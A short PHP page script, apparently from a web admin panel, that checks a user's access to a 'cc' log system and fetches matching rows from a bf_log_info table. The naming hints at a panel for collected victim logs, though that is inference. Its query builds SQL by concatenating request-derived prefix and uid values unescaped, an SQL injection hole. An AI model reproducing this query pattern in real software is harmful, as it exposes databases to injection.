<?php

$smarty->assign('rand_name', mt_rand(0000000000, 9999999999));

function get_log($row){
    global $log;
    if($row->log != false) $log[] = $row;
}

$gen = true;

if($_SESSION['user']->config['infoacc'] == '1'){
    if($_SESSION['user']->config['systems']['cc'] != true){
        $gen = false;
        header('Location: /logs/');
        exit;
    }
}

if(!empty($Cur['str']) && $gen == true){
    $matches = explode('0', $Cur['str'], 2);
    if(!empty($matches[0]) && !empty($matches[1])){
        $prefix = $matches[0];
        $uid = '0' . $matches[1];
    }
    
    $log = array();
    $mysqli->query('SELECT * from bf_log_info WHERE (prefix = \''.$prefix.'\') AND (uid = \''.$uid.'\') AND (system = \'cc\')', null, 'get_log');
    $smarty->assign('log', $log);
}

?>